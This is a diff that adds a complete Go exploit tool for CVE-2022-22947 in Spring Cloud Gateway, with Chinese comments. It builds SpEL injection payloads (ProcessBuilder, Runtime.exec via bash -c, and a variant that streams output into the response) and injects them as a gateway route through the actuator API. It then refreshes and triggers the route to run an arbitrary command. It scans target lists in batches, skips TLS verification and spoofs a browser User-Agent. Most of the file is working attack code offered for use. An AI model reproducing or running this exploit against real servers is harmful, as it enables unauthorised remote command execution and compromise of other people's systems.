@@ -1,0 +1,602 @@
+package main
+
+import (
+	"bytes"
+	"crypto/tls"
+	"encoding/json"
+	"flag"
+	"fmt"
+	"io/ioutil"
+	"log"
+	"net/http"
+	"net/url"
+	"os"
+	"regexp"
+	"strings"
+	"time"
+)
+
+// 漏洞检测配置
+type Config struct {
+	TargetURL      string
+	ProxyURL       string
+	Timeout        int
+	Command        string
+	UseHTTPS       bool
+	Headers        map[string]string
+	VerifyOnly     bool
+	CustomRouteID  string
+}
+
+// 漏洞检测结果
+type Result struct {
+	Vulnerable     bool   `json:"vulnerable"`
+	URL            string `json:"url"`
+	Method         string `json:"method"`
+	Payload        string `json:"payload"`
+	ResponseStatus int    `json:"response_status"`
+	ResponseBody   string `json:"response_body"`
+	Error          string `json:"error,omitempty"`
+	CommandOutput  string `json:"command_output,omitempty"`
+	Timestamp      string `json:"timestamp"`
+}
+
+// 网关路由配置
+type GatewayRoute struct {
+	ID       string        `json:"id"`
+	Filters  []interface{} `json:"filters"`
+	URI      string        `json:"uri"`
+	Predicates []interface{} `json:"predicates"`
+	Order    int           `json:"order"`
+}
+
+// 漏洞利用payload生成器
+type PayloadGenerator struct {
+	Command string
+	RouteID string
+}
+
+// 生成不同的payload
+func (p *PayloadGenerator) GeneratePayloads() map[string]string {
+	payloads := make(map[string]string)
+	
+	// 原始SpEL表达式payload
+	spelPayload := fmt.Sprintf(`{
+		"id": "%s",
+		"filters": [{
+			"name": "AddResponseHeader",
+			"args": {
+				"name": "Result",
+				"value": "#{new java.lang.ProcessBuilder(\"%s\").start()}"
+			}
+		}],
+		"uri": "http://example.com",
+		"predicates": [{
+			"name": "Path",
+			"args": {
+				"pattern": "/test"
+			}
+		}]
+	}`, p.RouteID, p.Command)
+	
+	payloads["original_spel"] = spelPayload
+	
+	// URL编码的payload
+	urlEncodedPayload := fmt.Sprintf(`{
+		"id": "%s",
+		"filters": [{
+			"name": "AddResponseHeader",
+			"args": {
+				"name": "result",
+				"value": "#{T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','%s'})}"
+			}
+		}],
+		"uri": "http://example.com",
+		"order": 0
+	}`, p.RouteID, p.Command)
+	
+	payloads["runtime_exec"] = urlEncodedPayload
+	
+	// 反射payload
+	reflectionPayload := fmt.Sprintf(`{
+		"id": "%s",
+		"filters": [{
+			"name": "AddResponseHeader",
+			"args": {
+				"_genkey_0": "#{T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec('%s').getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())}"
+			}
+		}],
+		"uri": "http://example.com",
+		"order": 0
+	}`, p.RouteID, p.Command)
+	
+	payloads["reflection"] = reflectionPayload
+	
+	return payloads
+}
+
+// 创建HTTP客户端
+func createHTTPClient(config *Config) *http.Client {
+	// 配置传输层
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		MaxIdleConns:    10,
+		IdleConnTimeout: 30 * time.Second,
+	}
+	
+	// 如果配置了代理
+	if config.ProxyURL != "" {
+		proxyURL, err := url.Parse(config.ProxyURL)
+		if err == nil {
+			tr.Proxy = http.ProxyURL(proxyURL)
+		}
+	}
+	
+	return &http.Client{
+		Transport: tr,
+		Timeout:   time.Duration(config.Timeout) * time.Second,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+	}
+}
+
+// 发送HTTP请求
+func sendRequest(client *http.Client, method, url, body string, headers map[string]string) (*http.Response, error) {
+	var req *http.Request
+	var err error
+	
+	if body != "" {
+		req, err = http.NewRequest(method, url, bytes.NewBufferString(body))
+	} else {
+		req, err = http.NewRequest(method, url, nil)
+	}
+	
+	if err != nil {
+		return nil, err
+	}
+	
+	// 设置默认请求头
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+	req.Header.Set("Accept", "*/*")
+	req.Header.Set("Connection", "close")
+	req.Header.Set("Content-Type", "application/json")
+	
+	// 设置自定义请求头
+	for key, value := range headers {
+		req.Header.Set(key, value)
+	}
+	
+	return client.Do(req)
+}
+
+// 检测漏洞是否存在
+func checkVulnerability(config *Config) *Result {
+	result := &Result{
+		URL:       config.TargetURL,
+		Timestamp: time.Now().Format("2006-01-02 15:04:05"),
+	}
+	
+	client := createHTTPClient(config)
+	
+	// 首先检查actuator端点是否存在
+	actuatorURL := fmt.Sprintf("%s/actuator", config.TargetURL)
+	resp, err := sendRequest(client, "GET", actuatorURL, "", config.Headers)
+	if err != nil {
+		result.Error = fmt.Sprintf("无法连接到目标: %v", err)
+		return result
+	}
+	defer resp.Body.Close()
+	
+	result.ResponseStatus = resp.StatusCode
+	body, _ := ioutil.ReadAll(resp.Body)
+	result.ResponseBody = string(body)
+	
+	// 检查是否存在gateway端点
+	if !strings.Contains(string(body), "gateway") {
+		// 尝试直接访问gateway端点
+		gatewayURL := fmt.Sprintf("%s/actuator/gateway/routes", config.TargetURL)
+		resp2, err := sendRequest(client, "GET", gatewayURL, "", config.Headers)
+		if err == nil {
+			resp2.Body.Close()
+			if resp2.StatusCode == 200 {
+				// 网关端点存在
+				result.Method = "GET"
+				result.Payload = "网关端点检测"
+				result.Vulnerable = true
+				return result
+			}
+		}
+		
+		result.Error = "未发现Spring Cloud Gateway Actuator端点"
+		return result
+	}
+	
+	// 生成payload
+	generator := &PayloadGenerator{
+		Command: config.Command,
+		RouteID: config.CustomRouteID,
+	}
+	
+	payloads := generator.GeneratePayloads()
+	
+	// 尝试不同的payload
+	for name, payload := range payloads {
+		routeURL := fmt.Sprintf("%s/actuator/gateway/routes/%s", config.TargetURL, config.CustomRouteID)
+		
+		// 发送创建路由的请求
+		resp, err := sendRequest(client, "POST", routeURL, payload, config.Headers)
+		if err != nil {
+			result.Error = fmt.Sprintf("发送请求失败: %v", err)
+			continue
+		}
+		
+		body, _ := ioutil.ReadAll(resp.Body)
+		resp.Body.Close()
+		
+		result.ResponseStatus = resp.StatusCode
+		result.ResponseBody = string(body)
+		result.Payload = name
+		result.Method = "POST"
+		
+		// 检查响应
+		if resp.StatusCode == 201 || resp.StatusCode == 200 {
+			result.Vulnerable = true
+			
+			// 如果不是仅检测模式，尝试触发命令执行
+			if !config.VerifyOnly {
+				// 刷新路由
+				refreshURL := fmt.Sprintf("%s/actuator/gateway/refresh", config.TargetURL)
+				refreshResp, _ := sendRequest(client, "POST", refreshURL, "", config.Headers)
+				if refreshResp != nil {
+					refreshResp.Body.Close()
+				}
+				
+				// 访问路由触发命令执行
+				triggerURL := fmt.Sprintf("%s/test", config.TargetURL)
+				triggerResp, _ := sendRequest(client, "GET", triggerURL, "", config.Headers)
+				if triggerResp != nil {
+					triggerBody, _ := ioutil.ReadAll(triggerResp.Body)
+					result.CommandOutput = string(triggerBody)
+					triggerResp.Body.Close()
+				}
+			}
+			
+			// 清理：删除创建的路由
+			deleteResp, _ := sendRequest(client, "DELETE", routeURL, "", config.Headers)
+			if deleteResp != nil {
+				deleteResp.Body.Close()
+			}
+			
+			// 再次刷新路由
+			refreshURL := fmt.Sprintf("%s/actuator/gateway/refresh", config.TargetURL)
+			refreshResp, _ := sendRequest(client, "POST", refreshURL, "", config.Headers)
+			if refreshResp != nil {
+				refreshResp.Body.Close()
+			}
+			
+			break
+		}
+	}
+	
+	return result
+}
+
+// 批量检测
+func batchScan(targets []string, config *Config) []*Result {
+	var results []*Result
+	
+	for _, target := range targets {
+		scanConfig := *config
+		scanConfig.TargetURL = target
+		
+		log.Printf("正在扫描: %s\n", target)
+		result := checkVulnerability(&scanConfig)
+		results = append(results, result)
+		
+		time.Sleep(1 * time.Second) // 避免请求过快
+	}
+	
+	return results
+}
+
+// 生成报告
+func generateReport(results []*Result) string {
+	var report strings.Builder
+	
+	report.WriteString("# CVE-2022-22947 漏洞检测报告\n\n")
+	report.WriteString(fmt.Sprintf("生成时间: %s\n\n", time.Now().Format("2006-01-02 15:04:05")))
+	
+	vulnerableCount := 0
+	totalCount := len(results)
+	
+	for i, result := range results {
+		report.WriteString(fmt.Sprintf("## 目标 %d: %s\n", i+1, result.URL))
+		report.WriteString(fmt.Sprintf("- 状态: %s\n", map[bool]string{true: "存在漏洞", false: "安全"}[result.Vulnerable]))
+		report.WriteString(fmt.Sprintf("- 检测时间: %s\n", result.Timestamp))
+		report.WriteString(fmt.Sprintf("- 响应状态: %d\n", result.ResponseStatus))
+		
+		if result.Error != "" {
+			report.WriteString(fmt.Sprintf("- 错误信息: %s\n", result.Error))
+		}
+		
+		if result.Vulnerable {
+			vulnerableCount++
+			report.WriteString(fmt.Sprintf("- 利用方法: %s %s\n", result.Method, result.Payload))
+			
+			if result.CommandOutput != "" {
+				report.WriteString(fmt.Sprintf("- 命令输出: %s\n", truncateString(result.CommandOutput, 200)))
+			}
+		}
+		
+		report.WriteString("\n")
+	}
+	
+	report.WriteString("## 统计信息\n")
+	report.WriteString(fmt.Sprintf("- 总扫描目标: %d\n", totalCount))
+	report.WriteString(fmt.Sprintf("- 存在漏洞: %d\n", vulnerableCount))
+	report.WriteString(fmt.Sprintf("- 安全目标: %d\n", totalCount-vulnerableCount))
+	report.WriteString(fmt.Sprintf("- 漏洞比例: %.2f%%\n", float64(vulnerableCount)/float64(totalCount)*100))
+	
+	return report.String()
+}
+
+// 截断字符串
+func truncateString(str string, length int) string {
+	if len(str) <= length {
+		return str
+	}
+	return str[:length] + "..."
+}
+
+// 从文件读取目标列表
+func readTargetsFromFile(filename string) ([]string, error) {
+	content, err := ioutil.ReadFile(filename)
+	if err != nil {
+		return nil, err
+	}
+	
+	lines := strings.Split(string(content), "\n")
+	var targets []string
+	
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		if line != "" && !strings.HasPrefix(line, "#") {
+			targets = append(targets, line)
+		}
+	}
+	
+	return targets, nil
+}
+
+// 验证目标URL格式
+func validateURL(target string) bool {
+	u, err := url.Parse(target)
+	if err != nil {
+		return false
+	}
+	
+	if u.Scheme != "http" && u.Scheme != "https" {
+		return false
+	}
+	
+	if u.Host == "" {
+		return false
+	}
+	
+	return true
+}
+
+func main() {
+	var config Config
+	
+	// 解析命令行参数
+	flag.StringVar(&config.TargetURL, "u", "", "目标URL (http://example.com:8080)")
+	flag.StringVar(&config.ProxyURL, "proxy", "", "代理服务器 (http://127.0.0.1:8080)")
+	flag.IntVar(&config.Timeout, "t", 10, "超时时间(秒)")
+	flag.StringVar(&config.Command, "c", "id", "要执行的命令")
+	flag.BoolVar(&config.UseHTTPS, "https", false, "使用HTTPS")
+	flag.StringVar(&config.CustomRouteID, "id", "exploit", "自定义路由ID")
+	flag.BoolVar(&config.VerifyOnly, "verify", false, "仅检测不执行命令")
+	
+	var headers string
+	flag.StringVar(&headers, "H", "", "自定义请求头 (Header1:Value1;Header2:Value2)")
+	
+	var targetFile string
+	flag.StringVar(&targetFile, "f", "", "目标列表文件")
+	
+	var outputFile string
+	flag.StringVar(&outputFile, "o", "", "输出报告文件")
+	
+	flag.Parse()
+	
+	// 设置默认请求头
+	config.Headers = map[string]string{
+		"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+		"Content-Type": "application/json",
+	}
+	
+	// 解析自定义请求头
+	if headers != "" {
+		pairs := strings.Split(headers, ";")
+		for _, pair := range pairs {
+			kv := strings.SplitN(pair, ":", 2)
+			if len(kv) == 2 {
+				config.Headers[strings.TrimSpace(kv[0])] = strings.TrimSpace(kv[1])
+			}
+		}
+	}
+	
+	// 目标列表
+	var targets []string
+	
+	// 检查输入源
+	if config.TargetURL != "" {
+		if !validateURL(config.TargetURL) {
+			log.Fatal("目标URL格式无效")
+		}
+		targets = append(targets, config.TargetURL)
+	} else if targetFile != "" {
+		fileTargets, err := readTargetsFromFile(targetFile)
+		if err != nil {
+			log.Fatalf("无法读取目标文件: %v", err)
+		}
+		targets = fileTargets
+	} else {
+		flag.Usage()
+		fmt.Println("\n示例:")
+		fmt.Println("  单目标检测: ./cve-2022-22947 -u http://target:8080")
+		fmt.Println("  批量检测: ./cve-2022-22947 -f targets.txt")
+		fmt.Println("  执行命令: ./cve-2022-22947 -u http://target:8080 -c 'whoami'")
+		os.Exit(1)
+	}
+	
+	log.Println("CVE-2022-22947 Spring Cloud Gateway RCE 漏洞检测工具")
+	log.Println("=" + strings.Repeat("=", 60))
+	
+	// 执行扫描
+	results := batchScan(targets, &config)
+	
+	// 生成报告
+	report := generateReport(results)
+	
+	// 输出报告
+	if outputFile != "" {
+		err := ioutil.WriteFile(outputFile, []byte(report), 0644)
+		if err != nil {
+			log.Printf("无法写入报告文件: %v", err)
+		} else {
+			log.Printf("报告已保存到: %s", outputFile)
+		}
+	}
+	
+	fmt.Println(report)
+	
+	// 统计结果
+	vulnerableCount := 0
+	for _, r := range results {
+		if r.Vulnerable {
+			vulnerableCount++
+		}
+	}
+	
+	if vulnerableCount > 0 {
+		log.Printf("警告: 发现 %d 个存在漏洞的目标!", vulnerableCount)
+		os.Exit(1)
+	} else {
+		log.Println("扫描完成: 未发现漏洞")
+		os.Exit(0)
+	}
+}
+
+// 高级检测功能
+type AdvancedScanner struct {
+	Client *http.Client
+	Config *Config
+}
+
+func NewAdvancedScanner(config *Config) *AdvancedScanner {
+	return &AdvancedScanner{
+		Client: createHTTPClient(config),
+		Config: config,
+	}
+}
+
+// 指纹识别
+func (s *AdvancedScanner) Fingerprint() bool {
+	endpoints := []string{
+		"/actuator",
+		"/actuator/gateway/routes",
+		"/actuator/health",
+		"/actuator/info",
+	}
+	
+	for _, endpoint := range endpoints {
+		url := fmt.Sprintf("%s%s", s.Config.TargetURL, endpoint)
+		resp, err := sendRequest(s.Client, "GET", url, "", s.Config.Headers)
+		if err == nil && resp.StatusCode == 200 {
+			body, _ := ioutil.ReadAll(resp.Body)
+			resp.Body.Close()
+			
+			// 检查Spring Cloud Gateway特征
+			if strings.Contains(string(body), "gateway") ||
+				strings.Contains(string(body), "Spring Boot") ||
+				strings.Contains(string(body), "application/json") {
+				return true
+			}
+		}
+	}
+	
+	return false
+}
+
+// 版本检测
+func (s *AdvancedScanner) DetectVersion() string {
+	url := fmt.Sprintf("%s/actuator/info", s.Config.TargetURL)
+	resp, err := sendRequest(s.Client, "GET", url, "", s.Config.Headers)
+	if err == nil && resp.StatusCode == 200 {
+		body, _ := ioutil.ReadAll(resp.Body)
+		resp.Body.Close()
+		
+		// 尝试解析JSON获取版本信息
+		var info map[string]interface{}
+		if json.Unmarshal(body, &info) == nil {
+			if build, ok := info["build"].(map[string]interface{}); ok {
+				if version, ok := build["version"].(string); ok {
+					return version
+				}
+			}
+		}
+		
+		// 尝试从响应头中获取信息
+		serverHeader := resp.Header.Get("Server")
+		if strings.Contains(serverHeader, "Spring") {
+			re := regexp.MustCompile(`Spring/([\d.]+)`)
+			if matches := re.FindStringSubmatch(serverHeader); len(matches) > 1 {
+				return matches[1]
+			}
+		}
+	}
+	
+	return "未知"
+}
+
+// 安全检测
+func (s *AdvancedScanner) SecurityCheck() map[string]bool {
+	checks := make(map[string]bool)
+	
+	// 检查是否启用认证
+	url := fmt.Sprintf("%s/actuator", s.Config.TargetURL)
+	resp, err := sendRequest(s.Client, "GET", url, "", s.Config.Headers)
+	if err == nil {
+		if resp.StatusCode == 401 || resp.StatusCode == 403 {
+			checks["authentication"] = true
+		} else {
+			checks["authentication"] = false
+		}
+		resp.Body.Close()
+	}
+	
+	// 检查是否暴露敏感端点
+	sensitiveEndpoints := []string{
+		"/actuator/env",
+		"/actuator/configprops",
+		"/actuator/heapdump",
+		"/actuator/trace",
+	}
+	
+	for _, endpoint := range sensitiveEndpoints {
+		url := fmt.Sprintf("%s%s", s.Config.TargetURL, endpoint)
+		resp, err := sendRequest(s.Client, "GET", url, "", s.Config.Headers)
+		if err == nil && resp.StatusCode == 200 {
+			checks["sensitive_exposed"] = true
+			resp.Body.Close()
+			break
+		}
+		if resp != nil {
+			resp.Body.Close()
+		}
+	}
+	
+	return checks
+}
